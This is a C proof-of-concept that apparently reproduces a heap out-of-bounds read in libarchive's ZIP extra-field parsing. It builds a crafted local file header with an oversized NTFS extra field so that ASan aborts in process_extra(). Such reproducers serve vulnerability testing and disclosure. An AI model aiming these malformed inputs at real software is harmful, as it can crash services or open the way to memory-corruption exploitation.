/*
 * Proof-of-concept for a heap-buffer-overflow (OOB read) in libarchive's
 * ZIP reader while parsing an entry's "extra field" area.
 *
 * Drives only the public API: archive_read_open_memory() feeds a crafted
 * ZIP local file header whose single NTFS (0x000A) extra field declares a
 * size larger than the record, and archive_read_next_header() parses it.
 *
 * On a vulnerable tree ASan aborts with a heap-buffer-overflow READ inside
 * process_extra(); on a safe tree the entry is simply rejected/parsed and
 * the program exits 0.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static void le16(unsigned char *p, unsigned v){ p[0]=v&0xff; p[1]=(v>>8)&0xff; }

int main(void)
{
	/* 30-byte local file header + 1-byte name "A" + 28-byte extra block. */
	const size_t FN = 1;
	const size_t EXTRA = 28;
	const size_t total = 30 + FN + EXTRA;
	unsigned char *buf = malloc(total);  /* tight malloc so ASan bounds it */
	if (!buf) return 2;
	memset(buf, 0, total);

	/* Local file header */
	memcpy(buf, "PK\003\004", 4);
	le16(buf + 4, 20);        /* version needed */
	le16(buf + 6, 0);         /* flags */
	le16(buf + 8, 0);         /* compression = store */
	/* times/crc/sizes left 0 */
	le16(buf + 26, (unsigned)FN);     /* filename length */
	le16(buf + 28, (unsigned)EXTRA);  /* extra field length */

	/* filename */
	buf[30] = 'A';

	/* extra block @ offset 31 */
	unsigned char *ex = buf + 30 + FN;
	le16(ex + 0, 0x000a);     /* headerid: NTFS */
	le16(ex + 2, 0xffff);     /* datasize: deliberately oversized */
	/* ex[4..7] reserved = 0 */
	le16(ex + 8, 0x0001);     /* tag = 1 */
	le16(ex + 10, 24);        /* size = 24 (3 x 8-byte FILETIME) */
	/* ex[12..27] only 16 of the 24 declared FILETIME bytes are present */

	struct archive *a = archive_read_new();
	archive_read_support_format_all(a);
	if (archive_read_open_memory(a, buf, total) != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		archive_read_free(a);
		free(buf);
		return 0;
	}

	struct archive_entry *entry;
	int r = archive_read_next_header(a, &entry);
	fprintf(stderr, "next_header rc=%d (%s)\n", r,
	    archive_error_string(a) ? archive_error_string(a) : "no error");

	archive_read_free(a);
	free(buf);
	return 0;
}
